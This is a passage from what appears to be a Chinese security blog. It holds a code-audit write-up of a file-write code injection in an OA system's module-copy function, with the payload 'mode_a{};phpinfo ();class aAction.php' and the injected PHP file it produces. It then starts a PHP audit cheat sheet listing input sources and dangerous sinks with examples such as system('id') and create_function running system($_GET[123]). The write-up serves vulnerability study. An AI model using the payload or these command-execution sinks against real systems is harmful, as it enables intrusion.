class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*复制模块</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copymodeAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="variable">$bhnu</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>)));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;新模块编号不能为空&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;模块编号不能用数字&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$bhnu</span>)&lt;<span class="number">4</span>)<span class="keyword">return</span> <span class="string">&#x27;编号至少要4位&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">isincn</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;编号不能包含中文&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbs</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;mode&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="string">&quot;`num`=&#x27;<span class="subst">$bhnu</span>&#x27;&quot;</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;模块编号[&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;]已存在&#x27;</span>;</span><br><span class="line"><span class="variable">$mrs</span> = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$mrs</span>)<span class="keyword">return</span> <span class="string">&#x27;模块不存在&#x27;</span>;</span><br><span class="line"><span class="variable">$ars</span> = <span class="variable">$mrs</span>;</span><br><span class="line"><span class="variable">$name</span>= <span class="variable">$mrs</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;复制&#x27;</span>;</span><br><span class="line"><span class="variable">$biaom</span>= <span class="variable">$bhnu</span>;</span><br><span class="line"><span class="variable">$obha</span> = <span class="variable">$mrs</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ars</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;num&#x27;</span>]  = <span class="variable">$bhnu</span>;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;table&#x27;</span>]= <span class="variable">$biaom</span>;</span><br><span class="line"><span class="variable">$tablea</span>[] = <span class="variable">$mrs</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"><span class="variable">$tables</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$staba</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$staba</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$zb1</span>)&#123;</span><br><span class="line"><span class="variable">$tables</span>.=<span class="string">&#x27;,&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.(<span class="variable">$kz</span>+<span class="number">1</span>).<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$zb1</span>, <span class="variable">$tablea</span>))<span class="variable">$tablea</span>[]=<span class="variable">$zb1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tables</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tables</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>] = <span class="variable">$tables</span>;</span><br><span class="line"><span class="variable">$modeid</span>  = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$ars</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//复制表</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$tablea</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$tabs</span>)&#123;</span><br><span class="line"><span class="variable">$sqla</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;show create table `[Q]&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$createsql</span> = <span class="variable">$sqla</span>[<span class="number">0</span>][<span class="string">&#x27;Create Table&#x27;</span>];</span><br><span class="line"><span class="variable">$biaom1</span>   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$kz</span>&gt;<span class="number">0</span>)<span class="variable">$biaom1</span>   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.<span class="variable">$kz</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$createsql</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;`&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;`&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;`&#x27;</span>,<span class="variable">$createsql</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createsql</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;alter table `&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;` AUTO_INCREMENT=1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//复制表单元素</span></span><br><span class="line"><span class="variable">$db1</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow_element&#x27;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;mid=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$k1</span>=&gt;<span class="variable">$rs1</span>)&#123;</span><br><span class="line"><span class="variable">$rs2</span> = <span class="variable">$rs1</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$rs2</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$rs2</span>[<span class="string">&#x27;mid&#x27;</span>] = <span class="variable">$modeid</span>;</span><br><span class="line"><span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$rs2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//复制相关布局文件</span></span><br><span class="line"><span class="variable">$hurs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfiles</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$hurs</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="variable">$from</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$obha</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$from</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>&lt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$fstr</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$from</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">0</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">1</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞代码主要出现在上面，可以看到<code>$bhnu = strtolower(trim($this-&gt;post(&#39;name&#39;)));</code>接收了外部输入，且在下面的copy中有使用到<code>$to</code>，这个变量是输入经过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br></pre></td></tr></table></figure><p>处理的，跟进createtxt函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*写入文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createtxt</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$txt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createdir</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$path</span>= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">@<span class="variable">$file</span>= <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="variable">$bo</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="variable">$bo</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$txt</span>)<span class="variable">$bo</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$bo</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到可以直接写入文件而没有过滤<br>写入的文件内容：<code>mode_a&#123;&#125;;phpinfo ();class aAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*此文件是流程模块【gong.通知公告】对应接口文件。</span></span><br><span class="line"><span class="comment">*可在页面上创建更多方法如：public funciton testactAjax()，用js.getajaxurl(&#x27;testact&#x27;,&#x27;mode_gong|input&#x27;,&#x27;flow&#x27;)调用到对应方法</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mode_a</span></span>&#123;&#125;;<span class="title function_ invoke__">phpinfo</span> ();<span class="class"><span class="keyword">class</span> <span class="title">aClassAction</span> <span class="keyword">extends</span> <span class="title">inputAction</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">savebefore</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">//$uarr[&#x27;receid&#x27;] = $this-&gt;flow-&gt;getreceids($arr[&#x27;receid&#x27;]);</span></span><br><span class="line"><span class="variable">$uarr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;issms&#x27;</span>]))<span class="variable">$uarr</span>[<span class="string">&#x27;issms&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;rows&#x27;</span> =&gt; <span class="variable">$uarr</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">saveafter</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交投票</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">submittoupiaoAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$mid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mid&#x27;</span>);</span><br><span class="line"><span class="variable">$sid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;sid&#x27;</span>);</span><br><span class="line"><span class="variable">$modenum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;modenum&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;flow= <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow&#x27;</span>)-&gt;<span class="title function_ invoke__">initflow</span>(<span class="variable">$modenum</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$towheer</span>= <span class="string">&quot;`table`=&#x27;infor&#x27; and `mid`=&#x27;<span class="subst">$mid</span>&#x27; and `name`=&#x27;投票&#x27; and `checkid`=&#x27;<span class="subst">$this</span>-&gt;adminid&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flow-&gt;flogmodel-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$towheer</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;你已投票了&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;flow-&gt;<span class="title function_ invoke__">addlog</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;投票&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mid&#x27;</span>  =&gt; <span class="variable">$mid</span>,</span><br><span class="line"><span class="string">&#x27;explain&#x27;</span> =&gt; <span class="string">&#x27;投票项ID(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span> </span><br><span class="line">));</span><br><span class="line"><span class="title function_ invoke__">m</span>(<span class="string">&#x27;infors&#x27;</span>)-&gt;<span class="title function_ invoke__">update</span>(<span class="string">&#x27;`touci`=`touci`+1&#x27;</span>,<span class="string">&#x27;`mid`=&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27; and `id` in(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要原因是在copymodeAjax 中 str_replace 把类名换了 然后 刚好payload可以闭合前面的内容，实现插入代码</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】PHP代码审计</title>
      <link href="/2024/10/02/WebSecurity/codeaudit/phpaudit/"/>
      <url>/2024/10/02/WebSecurity/codeaudit/phpaudit/</url>
      
        <content type="html"><![CDATA[<p>PHP代码审计入门指南  <a href="https://www.yuque.com/burpheart/phpaudit/">https://www.yuque.com/burpheart/phpaudit/</a><br>PHP-Audit-Labs <a href="https://github.com/hongriSec/PHP-Audit-Labs?tab=readme-ov-file">https://github.com/hongriSec/PHP-Audit-Labs?tab=readme-ov-file</a></p><h2 id="PHP-用户可控输入"><a href="#PHP-用户可控输入" class="headerlink" title="PHP 用户可控输入"></a>PHP 用户可控输入</h2><table><thead><tr><th>框架&#x2F;全局变量</th><th>获取URL参数（GET）</th><th>获取POST参数</th><th>获取上传文件</th><th>获取Cookie参数</th><th>获取服务器参数</th><th>获取请求体</th><th>获取JSON数据</th><th>文件上传方法</th></tr></thead><tbody><tr><td>PHP原生</td><td>$_GET</td><td>$_POST</td><td>$_FILES</td><td>$_COOKIE</td><td>$_SERVER</td><td>php:&#x2F;&#x2F;input</td><td>无</td><td>无</td></tr><tr><td>ThinkPHP5</td><td>Request::instance()-&gt;get(); input(‘get.’)</td><td>Request::instance()-&gt;post(); input(‘post.’)</td><td>Request::instance()-&gt;file();</td><td>Request::instance()-&gt;cookie(); input(‘cookie.’)</td><td>Request::instance()-&gt;server(); input(‘server.’)</td><td>Request::instance()-&gt;request(); input(‘request.’)</td><td>Request::instance()-&gt;get(); input(‘get.’);</td><td>$request-&gt;getJSON();</td></tr><tr><td>ThinkPHP3.*</td><td>I(‘get.’)</td><td>I(‘post.’)</td><td>无</td><td>无</td><td>无</td><td>无</td><td>无</td><td>无</td></tr><tr><td>Codeigniter2&#x2F;3</td><td>$this-&gt;input-&gt;get()</td><td>$this-&gt;input-&gt;post()</td><td>$this-&gt;input-&gt;file()</td><td>$this-&gt;input-&gt;cookie()</td><td>$this-&gt;input-&gt;server()</td><td>$this-&gt;input-&gt;post()</td><td>$this-&gt;input-&gt;raw_input_stream</td><td>无</td></tr><tr><td>Codeigniter4</td><td>$request-&gt;getGet()</td><td>$request-&gt;getPost()</td><td>$request-&gt;getFiles()</td><td>$request-&gt;getCookie()</td><td>$request-&gt;getServer()</td><td>$request-&gt;getPost(); $request-&gt;getJSON();</td><td>$request-&gt;getJSON()</td><td>$this-&gt;request-&gt;getFiles();</td></tr><tr><td>CakePHP 4.*</td><td>$this-&gt;request-&gt;getQuery(‘’);</td><td>$this-&gt;request-&gt;getData(‘’);</td><td>$this-&gt;request-&gt;getUploadedFile(‘’);</td><td>无</td><td>$this-&gt;request-&gt;getServer();</td><td>$this-&gt;request-&gt;getData(‘’);</td><td>$this-&gt;request-&gt;input(‘json_decode’);</td><td>无</td></tr><tr><td>Yii 2.0</td><td>$request-&gt;get();</td><td>$request-&gt;post();</td><td>$request-&gt;getBodyParam(‘’);</td><td>$request-&gt;getCookies();</td><td>$request-&gt;getHeaders();</td><td>$request-&gt;getBodyParam(‘’);</td><td>无</td><td>无</td></tr><tr><td>Laravel</td><td>$request-&gt;query(‘’);</td><td>$request-&gt;input(‘’);</td><td>$request-&gt;file(‘’);</td><td>$request-&gt;cookie(‘’);</td><td>无</td><td>$request-&gt;input(‘’);</td><td>$request-&gt;json();</td><td>$request-&gt;file(‘’);</td></tr></tbody></table><h2 id="PHP-敏感函数"><a href="#PHP-敏感函数" class="headerlink" title="PHP 敏感函数"></a>PHP 敏感函数</h2><table><thead><tr><th>函数&#x2F;语法</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>system</td><td>执行命令并输出结果</td><td>system(‘id’);</td></tr><tr><td>exec</td><td>执行命令 只可获取最后一行结果</td><td>exec(‘id’, $a); print_r($a);</td></tr><tr><td>passthru</td><td>同 system</td><td>passthru(‘id’);</td></tr><tr><td>shell_exec</td><td>执行命令并返回结果</td><td>$a&#x3D;shell_exec(‘id’); print_r($a);</td></tr><tr><td>&#96; (反引号)</td><td>执行命令并返回结果</td><td>$a&#x3D;<code>id</code>; print_r($a);</td></tr><tr><td>popen</td><td>执行命令并建立管道 返回一个指针 使用fread等函数操作指针进行读写</td><td>$a&#x3D;popen(“id”, “r”); echo fread($a, 2096);</td></tr><tr><td>proc_open</td><td>同 popen (进程控制功能更强大)</td><td>见PHP手册</td></tr><tr><td>pcntl_exec</td><td>执行命令 只返回是否发生错误</td><td>pcntl_exec(‘id’);</td></tr></tbody></table><h2 id="代码注入-文件包含"><a href="#代码注入-文件包含" class="headerlink" title="代码注入&#x2F;文件包含"></a>代码注入&#x2F;文件包含</h2><table><thead><tr><th>函数&#x2F;语法结构</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>eval</td><td>将传入的参数内容作为PHP代码执行，eval不是函数，是一种语法结构，不能当做函数动态调用</td><td><code>eval(&#39;phpinfo();&#39;);</code></td></tr><tr><td>assert</td><td>将传入的参数内容作为PHP代码执行，PHP7以下是函数，PHP7及以上为语法结构</td><td><code>assert(&#39;phpinfo();&#39;);</code></td></tr><tr><td>preg_replace</td><td>当<code>preg_replace</code>使用&#x2F;e修饰符且原字符串可控时，有可能执行PHP代码</td><td><code>echo preg_replace(&quot;/e&quot;,&quot;&#123;$&#123;PHPINFO()&#125;&#125;&quot;,&quot;123&quot;);</code></td></tr><tr><td>call_user_func</td><td>把第一个参数作为回调函数调用，两个参数都完全可控时可利用，传入一个参数调用</td><td><code>call_user_func(&#39;assert&#39;, &#39;phpinfo();&#39;);</code></td></tr><tr><td>call_user_func_array</td><td>同<code>call_user_func</code>，可传入一个数组带入多个参数调用函数</td><td><code>call_user_func_array(&#39;file_put_contents&#39;, [&#39;1.txt&#39;,&#39;6666&#39;]);</code></td></tr><tr><td>create_function</td><td>根据传递的参数创建匿名函数，并返回唯一名称，利用时第二个参数可控</td><td><code>$f = create_function(&#39;&#39;,&#39;system($_GET[123]);&#39;); $f();</code></td></tr><tr><td>include</td><td>包含并运行指定文件，执行出错会抛出错误</td><td><code>include &#39;vars.php&#39;;</code> (括号可有可无)</td></tr><tr><td>require</td><td>同<code>include</code>，执行出错会抛出警告</td><td><code>require(&#39;somefile.php&#39;);</code> (括号可有可无)</td></tr><tr><td>require_once</td><td>同<code>require</code>，但会检查之前是否已经包含该文件，确保不重复包含</td><td></td></tr><tr><td>include_once</td><td>同<code>include</code>，但会检查之前是否已经包含该文件，确保不重复包含</td><td></td></tr></tbody></table><h2 id="SQL-LDAP注入"><a href="#SQL-LDAP注入" class="headerlink" title="SQL&#x2F;LDAP注入"></a>SQL&#x2F;LDAP注入</h2><table><thead><tr><th>函数&#x2F;方法</th><th>备注</th></tr></thead><tbody><tr><td><code>mysql_query</code></td><td></td></tr><tr><td><code>odbc_exec</code></td><td></td></tr><tr><td><code>mysqli_query</code></td><td></td></tr><tr><td><code>mysql_db_query</code></td><td></td></tr><tr><td><code>mysql_unbuffered_query</code></td><td></td></tr><tr><td><code>mysqli::query</code></td><td>用法示例：<code>$mysqli = new mysqli(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;world&quot;); $mysqli-&gt;query();</code></td></tr><tr><td><code>pg_query</code></td><td></td></tr><tr><td><code>pg_query_params</code></td><td></td></tr><tr><td><code>pg_send_query</code></td><td></td></tr><tr><td><code>pg_send_query_params</code></td><td></td></tr><tr><td><code>sqlsrv_query</code></td><td></td></tr><tr><td><code>pdo::query</code></td><td>用法示例：<code>$pdo = new PDO(&quot;mysql:host=localhost;dbname=phpdemo&quot;, &quot;root&quot;, &quot;1234&quot;); $pdo-&gt;query($sql);</code></td></tr><tr><td><code>SQLite3::query</code></td><td></td></tr><tr><td><code>SQLite3::exec</code></td><td>用法示例：<code>$db = new SQLite3(&#39;mysqlitedb.db&#39;); $db-&gt;query(&#39;SELECT bar FROM foo&#39;); $db-&gt;exec(&#39;CREATE TABLE bar (bar STRING)&#39;);</code></td></tr><tr><td><code>$mongo = new mongoclient(); $data = $coll-&gt;find($data);</code></td><td>参考：<a href="https://wooyun.js.org/drops/Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.html">MongoDB注入攻击</a></td></tr><tr><td><code>$ld = ldap_connect(&quot;localhost&quot;); $lb = @ldap_bind($ld, &quot;cn=test,dc=test,dc=com&quot;, &quot;test&quot;);</code></td><td>参考：<a href="https://www.cnblogs.com/0nc3/p/12063436.html">LDAP注入攻击</a></td></tr><tr><td><code>Db::query</code></td><td>ThinkPHP框架</td></tr><tr><td><code>Db::execute</code></td><td>ThinkPHP框架</td></tr></tbody></table><h2 id="文件读取-SSRF"><a href="#文件读取-SSRF" class="headerlink" 